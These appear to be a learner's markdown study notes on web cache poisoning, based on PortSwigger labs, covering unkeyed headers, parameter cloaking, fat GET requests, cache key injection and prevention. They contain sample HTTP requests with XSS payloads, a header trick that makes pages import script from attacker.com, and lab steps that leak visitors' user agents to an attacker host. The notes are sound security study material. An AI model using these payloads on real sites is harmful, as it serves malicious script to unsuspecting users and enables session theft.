# Web Cache Poisoning
## What is Web Cache Poisoning
- Web cache poisoning is an advanced technique whereby an attacker exploits the behavior of a web server and `cache` so that a harmful `HTTP response` is served to other users.
- Fundamental Web cache Poisoning involves two phases
	- first the attacker must work out how to elicit a response from the back-end server that inadvertently contains some kind of dangerous payload.
	- once 1 st step is done is successfully done, they need to make sure that their response is cached and subsequently served to the intended victim.
- A poisoned web cache can potentially be a devastating means of distributing numerous different attacks, exploiting vulnerabilities such as `XSS`,`Javascript injection`, `openRedirection` and so on

## How Does a web cache Work
#### To understand how a web cache poisoning vulnerabilities arise, it is important to have basic understanding of how web caches work.
- If a server had to send a new response to every Single `HTTP request` separately, this would likely overload the server, resulting in latency issue and poor user experience, especially during busy periods, Caching is primarily a means of reducing such issues.
- The cache sits between the server and the user, where it saves/caches the response to a `perticular request` for fixed amount of time.
- if another  user sends equivalent request in that time, the cache simply serves a copy of cached response directly to the user, whitout any interaction with `back-end`
- This greatly eases the load on the server by reducing the number of duplicate request it has to handle.
![[web-cache-poisoning1.png]]
![](https://github.com/DK9510/Img/blob/main/web-cache-poisoning1.png)

## Cache Keys
- When the cache receives an `HTTP response` it first has to determine whether there is a cached response that it can serve directly or whether it has to forward the request for handling by the `back-end server`.
- Caches identify equivalent requests by comparing a predefined subset of the request's components, known collectively as the `Cache Key`.
- This would contain the `request line`and `host header`. Components of the request that are not included in the `cache key` are said to be ``unkeyed``.
- if the `cache key` of an incoming request matches the key of a previous request, then the cache considers them to be equivalent.
- As a result it will serve a copy of the `cached response that was generated for the original requst`, this applies to all subsequent requests, with the matching cache key, until the cached response expires.
- Crucially the other components of the request are ignored altogether by the cache.

## Impact of Web Cache Poisoning Attack
#### the impact of web cache poisoning depends on 2 factor
1. What exactly the attacker can successfully cached
2. The 	amount of traffic on the attected page,  example: if attacker poison a cached response on the home page of major website , it could affect thousands of users without any subsequent interaction from the attacker
`NOTE:` The duration of a cache entry doesn't necessarily affect the impact of web cache poisoning, since an attacker can usually be scripted in such a way that it re-poisons the cache indefinitely.

# Constructing A web cache poisoning Attack
1. identify and evaluate `unkeyed` inputs
2. Elicit a harmful response from the back-end server
3. Get the response cached.

## 1)Identifying and Evaluate `unkeyed` Inputs.
- Any web cache poisoning attack on manipulation of `unkeyed` inputs, such as `headers`.
- web caches ignore `unkeyed` inputs when deciding whether to serve a cached response to the user.
- This means that we can use them to inject your payload and elicit a `poisoned` response which if cached, will be served to all users whose requests have the same `cache key` 
- 1 st step is to identify the `unkeyd inputs` that are supported by the servers.
#### how to identify unkeyd inputs
1. it is generally identified by adding random and observing whether or not the have an effect on the response, this can be obvious , such as `reflecting input` directly in the response or triggering `entirely different response`.
2. we use tools like `Burp Comparer` to compare the response with and without the injected input, this still need significant amount of manual effort
### param Miner
- it is burp extension for identifying `unkeyed inputs`
- how to use: right click on a request that we want to investigate click `Guess headers`.
- Param miner runs in background sending request containing different inputs 
- if response containing one of injected inputs has an effect on the response, `param miner` logs this in Burp
- `issue panel` if using `burp professional`
- `Output` tab of extension ("Extender">Extensions>param Miner> output) if `community edition`

- **`Caution:`** when testing unkeyd inputs on live website, there is risk of inadvertently causing the cache to serve your generated response to real users.
-  therefor make sure that `your all requests have a uniqe cache key` so that they will only be served to you.
-  To do this manually add `cache buster (such  sa unique parameter` to the request line each time we make request, if using `param miner ` there is option for `automatically adding a cache buster to every request`

## 2)Elicit a Harmful Response from the back-end server
- once we identified `unkeyed input`, evaluate how the website process it.
- understanding essential to successfully eliciting harmful response.
- if an input is reflected in the response from the server without being properly sanitized or used to generate dynamically generate other data, then this is potential entry point for `web cache poisoning`

## 3)Get the Response cached
- Manipulating inputs to elicit a harmful response is half of attack, but it doesn't achieve much unless we can cause the response to be `cached` which can sometimes be tricky.
- Response get cached or not depends on kind of factors such as `file extention`,`content-type`, `route`, `status code`, and `response headers`.
- You will probably need to devote some time to simply playing around with requests on different pages and studying how the cache behaves. Once you work out how to get a response cached that contains your malicious input, you are ready to deliver the exploit to potential victims.

# Exploiting web cache poisoning vulnerabilities
- web cache poisoning vulnerability arise due to general flows in the design of cache.
- other is the way the cache is implemented by a specific website can introduce unexpected quirks that can be exploited.

# Exploiting cache Design Flaws
- websites are vulnerable to web cache poisoning if they handle unkeyed input in an unsafe way and allow the subsequesnt HTTP response to be cached.

## Using Web cache Poisoning to Deliver XSS attack
- when unkeyd input is reflected in a cacheable response without proper sanitization
`request`
```js
GET /en?region=in HTTP/1.1
Host: vuln-web.com
X-Forwarded-Host: vuln-web.com
```
`response`
```js
HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="https://vuln-web.co.in/cms/social.png" />
```
here `X-Forwarded-For:`header is used to dynamically generate opengraph image which reflect in response, since `X-Forwarded-For:` in unkeyed, in this cache is `poisoned with response containing XSS payload`
request
```js
GET /en?region=in HTTP/1.1
Host: vuln-web.com
X-Forwarded-For: a."><script>alert(0)</script>"
```
response
```js
HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" contet="https://a."><script>alert(0)</script>"/cms/social.png" />
```
if this is cached then any user visit en?region=in endpoint would get popup and this can be becoume dengerous for stealing password and session token etc.

## Using web cache poisoning to exploit unsafe handling of resource imports
- some website use `unkeyed headers` to dynamically generate `URLs` for importing resources, such as externally hosted `javascript files` 
- in this case attacker change the value of `appropriate header` to domain that they control,  they manipulate URL to Point their own `malicious javascript file` instead

`example:`
```js
GET / HTTP/1.1
Host: vuln-web.com
X-Forwarded-Host: attacker.com
User-Agent: Mozilla/5.0 
```
response
```js
HTTP/1.1 200 OK
<script> src="https://attacker.com/static/analytics.js"></script>
```

- identify the unkey header and like `X-Forwarded-Host:` and supply any arbitrary url and see in the response if that is reflected or not and if reflecting then put XSS payload 
- `NOTE :` dont forget to put `cachebuster` any parameter like `?cb=1234` so other user's can not affected by this.

## Using Web-cache poisoning to exploit cookie handling vulnerabilities
- Cookies are often used to dynamically generate content in a response.
- example: cookie that indicates the user's preferred language, which is then used to load the corresponding version of the page.
```js
GET /blog/post.php?mobile=1 HTTP/1.1
Host: vuln-web.com
User-Agent: Mozilla/5.0 
Cookie: language=fr;
Connection: close
```
in this example the French version of the blog post is being requested, since the information about which language version to serve the user is only contained in the `Cookie header`.
- suppose that the `cache key` contains the request line and HOST header, but not the  cookie header. 
- in this case, if the response to this request is cached,  then all subsequent users who tried to access this blog post would receive the `french` version as well, regard less which language they actually selected.
- This flawed handling of cookies by the cache can also be exploited using web cache poisoning techniques. In practice, however, this vector is relatively rare in comparison to header-based cache poisoning. When cookie-based cache poisoning vulnerabilities exist, they tend to be identified and resolved quickly because legitimate users have accidentally poisoned the cache.
- see the `cookie` value is reflecting in the response and see the payload in the response and `X-Cache: hit` in the headers, that means we hit the cached web page

## Using Multiple Headers to exploit Web Cache Poisoning Vulnerabilities
- some websites are require more sophisticated attacks and only become vulnerable when an attacker is able to craft a request that manipulates unkeyed inputs.
- example: website require secure communication using HTTPS. TO enforce this, if a request that uses another protocol is received, the website dynamically generates redirect to itself that does use HTTPS
```js
GET /random HTTP/1.1
Host: vuln-web.com
X-Forwarded-Proto: http
```
```js
HTTP/1.1 301 Moved Permanently
Location: https://vuln-web.com/random
```
by Itself this behavior isn't vulnerable, but combining this with what we learned earlier about vulnerabilities in dynamically generated URLs, attacker could potentially exploit this behavior to generate cacheable response that redirect user to malicious domain.
[Lab porswigger](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers)

- find unkeyed header from requests from which the request which request to `.js` files
- inject X-forwarded-scheme: to non http host
- it is redirecting to our main domain
- add X-Forwarded-Host: to attacker.domain
- now it will redirect to attacker.domain
- go to our exploit server in the same path where the request is initiated put malicious js file and then initiate request and it redirect to our attacker.domain
- send request until the response is cached or `x-cache:` hit 
- visit website's home page and it run our script.

## Exploiting Response that expose Too much information
### Cache control Directives
- one challenge wile constructing Web cache poisoning is whether the harmful response is get cached.
- this require manual trial and error, need to study the behavior of cached response.
`example:` revel how old currently cached response.
```js
HTTP/1.1 200 OK
Via: 1.1 varnish-v4
Age: 174
Cache-Control: public, max-age=1800
```
although this doesnt directly lead to web cache poisoning vulnerability, it save some time and effort for attacker to do less manual work on when the new response is cached and when attacker can poison cache.
### Vary header
-  `Vary` header is often used can also provide attackers with a helping hand
-  it specifies a list of additional headers that should be treated as part of the cache key even if they are normally unkeyed.
-  commonly used to specify the `user-agent` is keyed, 
-  example: if the mobile version is cached, this won't be served to non-mobile users by mistake.
- This information can also be used to construct a multi-step attack to target a specific subset of users. For example, if the attacker knows that the `User-Agent` header is part of the cache key, by first identifying the user agent of the intended victims, they could tailor the attack so that only users with that user agent are affected.
[lab Targeted web cache poisoning using unknown header](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header)
- since using `param miner` we found header which unkeyed and used to request the .js file we exploit them using crafting malicious .js files
- but there is `vary`: user-agent that means the cache is only available to only that user agent which we have used to send the request not other.
- so we need to identify user-agent for victim
- there is comment section, that allows HTML tags we use `<img src="https:/attacker.com/anything"`
- and change the user agent and repeat the request until `X-cache: hit` and we successfully exploited it 

## Using Web Cache Poisoning TO exploit Dom based Vulnerabilities
- if website unsafely uses unkeyd headers to import files, this can potentially be exploited by an attacker to import a malicious file instead, how applied to more than just JS files.
- Example: attacker poison cache with a response that imports a `JSON` file containing the following payload
`{"SomeProperty": "<svg onload=alert(0)>"}`
if web passes the value to of this property to `sink` that supports `Dynamic code execution` , the payload would be executed in the context of victim's browser session.
```js
HTTP/1.1 200 OK
Content-Type:application/json
Access-Control-Allow-Origin: \*0
{
"malicious JSON":"malicious JSON"
}
```

[Lab Portswigger ](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria)

## Chaining Web Cache Vulnerabilities
- some times we need to make chain of web cache poisoning in order to exploit it 
- example: [lab portswigger](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-combining-vulnerabilities)

# Exploiting Cache Implementation Flaws
- here we saw how much greater attack surface for web cache poisoning by exploiting `quirks` in specific Implementation of Caching Systems.
[research web cache Entanglement](https://portswigger.net/research/web-cache-entanglement)

# Cache Key Flaws
- Generally Website take most of their input from the URL path and the query stings, resulting is well-trodden Attack Surface for various hacking Techniques.
- if website have implemented `cache key`then any input injected via keyed inputs act as `cache buster` that means this cache never serve this to other users
- some websites and CDNs perform various transformation of keyed components when they are served in the cache key like
	- Excluding the Query string
	- Filtering Out Specific Query parameters
	- Normalizing Input in KEYED components
- these transformation may introduce a few Unexpected  quirks. 
- These are primarily based around discrepancies between the data that is written to the cache key and the data that is passed into the application code, even though it all stems from the same input. These cache key flaws can be exploited to poison the cache via inputs that may initially appear unusable.

## Cache Probing Methodology
- this methodology is slightly different from class methodology, these is rely on the `flaws in the specific implementation` and `configuration` of the cache, which vary from `site/application` to `site/application`. this require deeper understanding of the target cache and its behavior
**Steps:**
#### 1) Identifying a suitable cache Oracle
#### 2) Probe Key Handling
#### 3) Identify an exploitable gadget

### Identifying a Suitable Cache Oracle
- `cache oracle` is a page or endpoint that provides feedback about the `cache's behavior`.  
- this need to be cacheeable and must indicate whether we received `cached resonse` or response directly from the server.
- this feed back could take various forms 
	- An HTTP header that explicitly tells you whether you got a `cache hit`
	- Observable changes to dynamic Content
	- Distinct Response times
- Ideally the cache oracle will also reflect the entire URL and at least one query parameter in the response. This will make it easier to notice parsing discrepancies between the cache and the application, which will be useful for constructing different exploits later.
- if we identify the `third party cache ` is being used, then we consult its documentation, that may contain how `default cache key `is constructed, we may find some handy tips that allow us to see `cache key` directly
```js
GET /?parm=1 HTTP/1.1
Host: someweb.com
Pragma: akamai-x-get-cache-key

HTTP/1.1 200 OK
X-cache-Key: someweb.com/?param=1
```

### Probe Key Handling 
- next step is investigate whether a cache performs any additional processing of your `input` when generating `cache key`.
- specifically look at any `transformation taking place`, and anything being `excluded` form the keyed component when it is added to the `cache key`, common `example:` excluding specific `query parameter or entire query string` and removing `port from the Host header`.
- if we have direct access to `cache key`then simply compare the key after injecting different inputs.
- unless we use our understanding of `cache oracle` to infer whether we got `correct cache response or not`
- for each case we want to test, send two similar request and `campare the response`
`Example:` we have `cache oracle in home  page` this automatically redirects user's to region-specific page, it use Host header `Location`
```js
GET / HTTP/1.1
Host: vuln-web.com

HTTP/1.1 302 Moved Permanently
Location: https://vuln-web.com/en
Cache-Status: miss

GET / HTTP/1.1
Host: vuln-web.com:1337

HTTP/1.1 302 Moved Permanently
Location: https://vuln-web.com:1337/en
Cache-Status: miss
```
now send another request but this time doesn't specify the port
```js
GET / HTTP/1.1
Host: vulne-web.com

HTTP/1.1 302 Moved Permanently 
Location: https://vuln-web.com:1337/en
Cache-Status: hit
```
here we see that we served `cached response` even though the Host header in the request does not specify a port, this proves that `port is excluded from the cache key`.

## 3)Identify exploitable gadget
- final step is identify a suitable gadget that we chain with this cache key flaw, this is `imp` because `severity` of the flaw depend on the gadget we able to exploit.
- These gadgets will often be classic client-side vulnerabilities, such as `reflected XSS` and `open redirects`. By combining these with web cache poisoning, you can massively escalate the severity of these attacks, turning a reflected vulnerability into a stored one. Instead of having to induce a victim to visit a specially crafted URL, your payload will automatically be served to anybody who visits the ordinary, perfectly legitimate URL.

# Exploiting Cache key Flaws
## unkeyed port
- the host header is often part of the cache key, initially seems unlikely candidate for injecting any kind of payload, `some caching system parse the header and exclude the port from the cache key`
- in this case we change the port and request and response is cached, and when normal request is send the `cached response is served` since we change the port the service is unreachable and do `denial of service`, this can be escalated when web allows to specify `non-numeric port`and that we inject `XSS` payload.

## Unkeyed query string
- like Host header, request line is typically `keyed` however one of most common `cache-key transformation` is to exclude the entire `query-string`
### Detecting Unkeyed Query string
- if response explicitly tell we got `cached-response` or not then it is simple to spot, but if server doesn't tell in the response that it is hard to know `whether we communicating with cache or server`.
- To identify the `dynamic page` observe how changing `parameter affect response`, but if `query string` is unkeyd then all time we get a `cached response`, and therefor an `unchanged response`, regardless of any parameter we add, `Clearly, this also make classic Cache-Buster query redundant`
- there are alternative ways of adding `cache buster`such as adding it to a keyed header that doesn't interfere with the application's behavior 
- Example:
```js
Accept-Encoding: gzip, deflate, cachebuster

Accept: */*, text/cachebuster

Cookie: cachebuster=123

Origin: https://cachebuster.vuln-web.com
```
in `param Miner` we have options `Add static/Dybamic` cache buster and `include cache buster in header`.it automatically add cachebuster to commonly keyed headers.
- Another approach is see whether there are any descrepancies between how cache and back-end normalize path of the request.
- as path is almost guaranted to be keyed, we exploit this issue request with `different keys` that still hit the same endpoint.
- the following entries might `cached saperately` but treated as equivalent to 
```js
GET / on backend
```
```
Apache:  GET //
Nginx:   GET /%2F
PHP:     GET /index.php/xyz
.NET:    GET /(A(xyz))/
```
this transformation can sometimes mask what otherwise be glaring obvious `refelected XSS` vuln.
### Exploiting Unkeyed query string
- excluding `cache key` can make these `reflected XSS` vulnerability even more severe.
-  Usually, such an attack would rely on inducing the victim to visit a maliciously crafted URL. However, poisoning the cache via an unkeyed query string would cause the payload to be served to users who visit what would otherwise be a perfectly normal URL. This has the potential to impact a far greater number of victims with no further interaction from the attacker.
- we see that query parameter are not included in cache key, and query parameter are reflected in the response and it is cached, we need cache buster and we find one using `param miner` which is `Origin:` header used as cache buster, and than inject malicious `XSS` Payload that cached in the response.

### Unkeyed Query parameter
- So far we've seen that on some websites, the entire query string is excluded from the cache key. But some websites only exclude specific query parameters that are not relevant to the back-end application, such as parameters for analytics or serving targeted advertisements. UTM parameters like `utm_content` are good candidates to check during testing.
- Parameters that have been excluded from the cache key are unlikely to have a significant impact on the response. The chances are there won't be any useful gadgets that accept input from these parameters.

## Cache Parameter Cloaking
- if cache excludes a harmless parameter from the cache key, and can't find any exploitable gadget based on the full URL.
- if we find out how cache parse the `URL`and remove unwanted parameter , we might find some interesting quirks.
`example:`
```js
GET /?example=123?excluded=bad-stuff
```
in this situation there is two parameter but cache server excluded 2nd parameter as cache key and bak-end server doesn't accept 2nd param since we didnt put ampersand`&` at end of 1 st param so it only take 1 st param and its value is `remaining entire URL string` including our payload, if value of example is passed into a useful gadget, than we have sucessfully injected paylad without affecting cache key

### Exploiting Parameter Quirks
- similar parameter cloaking issue arise in opposite scenerio, where back-end identifies distinct parameters, that cache does not 
`example:` Ruby on rails framework interprets both `&` and `;` as delimiters.
- when used in conjunction with a cache that does not allow this, we can potentially exploit another quirk to override the value of a keyed parameter in the application logic.
`GET /?keyed_param=abc&excluded_param=123;keyed_param=bad-stuff`
- `keyed_param` in the cache key, but `excluded_param` is not, many caches will only interpret this as two parameters, delimited by the `&`
` 1)keyed_param=abc`
` 2)excluded_param=123;keyed_param=our-payload`
- once the parsing algorithm removes the `excluded_param` the cache key will only contain `keyed_param=abc`, on the back-end, however ruby on rails sees `;` and split
```
1 keyed_param=abc
2 excluded_param=123
3 keyed_param=our-payload
```
now there is duplicate param, if this happened ruby on rails choose final occurrence.
- Final resulting the cache key contains`innocent and expected parameter valude` allowing cached response to be served to other users, while on back-end , the same parameter have completely `different-value`, which is our injected payload.
- This exploit is especially powerful if it gives you control over function that will be executed.
`example:` if website/application using `JSONP` to make a cross-domain request, this will often contain a `callback parameter` to execute a given function on the returned data
`GET /jsonp?callback=Function(example: alert(0)etc`

## exploiting fat GET
- in select cases HTTP method may not be Keyed, this might allow us to poison the cache with `POST` requesting containing a malicious payload in the body.
- our payload would be served in `Response to GET` request,
```js
GET /?parm=normal-value HTTP/1.1
...
param=malicious-payload
```
in this case, the cache key would be based on the request line, but server-side value for the parameter would be taken from the body
- some website doesn't accept body parameter in the `GET` request than we bypass it using
```js
GET /?param=noraml-value HTTP/1.1
Host: vuln-web.com
X-HTTP-Method-Override: POST
...
param=malicious-vlue
```
As long X-HTTP-Method-Override header is unkeyed we take advantage of this by submitting pseudo-POST, preserving `GET` cache key derived from the request line.

## Exploiting Dynamic Content in Resource imports
- imported resource files are typically static, but some reflect input from the query string.
- this is harmless but by combining it with `Web-cache-poisoning`, occasionally we inject content into the resource file.
```js
GET /style.css?excluded_param=alert(1)%0A{}*{color:red;} HTTP/1.1  
  
HTTP/1.1 200 OK  
Content-Type: text/html  
…  
This request was blocked due to…alert(1){}*{color:red;}
```

## Normalized Cache Keys
- any normalization applied to the `cache key` can also be exploitable behavior, occasionally it enable some exploits that otherwise impossible to exploit
`Example:` when find reflected `XSS` in the parameter, it is often unexploitable in practice, because modern browsers typically `URL-Encode` the necessary characters when sending the request, and server doesn't decode them, the response that the intended victim receive will contain `harmless` URL encoded character.
- some caching implimentation normalize keyed input, when adding it to the cache key.
- in this case both following have same key
```
GET /exampls?param="><test>
GET /exampls?param=%22%3e%3ctest%3e
```
- this behavior allow us to exploit these.
- we can send malicious request using `BURP repeater` and poison the cache with `unencoded XSS payload`.
- when victim visits malicious `URL`, the payload will still URL Encoded by their browser, however when URL normalized by the cache, it will have the same cache key as the response containing our `unecoded payload`

## Cache Key Injection
- sometimes discover client-side vulnerability in keyed header, this is also classic-unexploitable vulnerability that can be exploited using cache poisoning
- Keyed component are often bundled together in a string to create the cache key, if the cache doesn't implement proper escaping of the delimiter between the components, we potentially exploit this behavior to craft `2` different request that have the same `cache key`.
`example:`
```js
GET /path?parm=123 HTTP/1.1
Origin: '-alert(0)-'__

HTTP/1.1 200 OK
X-Cache-Key: /path?parm=123__Origin='-alert(0)-'__

<script>...'-alert(0)-'...</script>
```
we have poisoned the cache, and now if we send the following `URL` it got poisoned response
```js
GET /path?parm=123__Origin='-alert(0)-'__ HTTP/1.1

HTTP/1.1 200 OK
X-Cache-Key: /path?parm=123__Origin='-alert(0)-'__
X-Cache: hit

<script>...'-alert(0)-'...</script>
```

# Poisoning Internal Cache
- sometimes developer implement Cacheing behavior directly into the application.
- instead caching entire response, these cache break response into reusable fragments and cache them each separately.
- the users might receive response comprising a mixture of content from the server, as well several individual cache fragments.
- since they are intended to be reusable across multiple distinct response, the concept of cache key doesn't apply
- this means if we poison 1 fragments that is used on every page, as there is no cache key, we have poisoned every page, for every user with a `single request`

## How to identify internal cache
- this is challenging or difficult to identify and investigate, because there is no user-feedback, to identify these cache we can look for a few-tale sign
`Example:` if the response reflects a mixture of both input from `the last request we sent and previous request`, this is key indicator that the cache is storing fragments rather than entire responses, these same applied if our input reflects in many pages, in particular on page which we never tried to inject input.
- Other times, the cache behavior is so unusual , so conclusion is they must be `ubiqe and specialize internal cache`

## Testing Internal Cache
- recommend to use `cache buster` to prevent poisoned response from being served to other users.
- if they have no concept of`cache key` , then traditional cache busters  are useless, this means it is easy to accidentally poison the cache for genuine users.
- when testing this kind of vulnerability carefully inject payload and send request, and make sure poison the cache using `domain that we control` instead of using `3 rd party domains`,this way we handle it if something goes wrong.

# prevention
-  if you do need to use caching, restricting it to purely static responses is also effective, provided you are sufficiently wary about what you class as "static". For instance, make sure that an attacker can't trick the back-end server into retrieving their malicious version of a static resource instead of the genuine one.
### take the following precautions when implementing caching:

-   If you are considering excluding something from the cache key for performance reasons, rewrite the request instead.
-   Don't accept fat `GET` requests. Be aware that some third-party technologies may permit this by default.
-   Patch client-side vulnerabilities even if they seem unexploitable. Some of these vulnerabilities might actually be exploitable due to unpredictable quirks in your cache's behavior. It could be a matter of time before someone finds a quirk, whether it be cache-based or otherwise, that makes this vulnerability exploitable.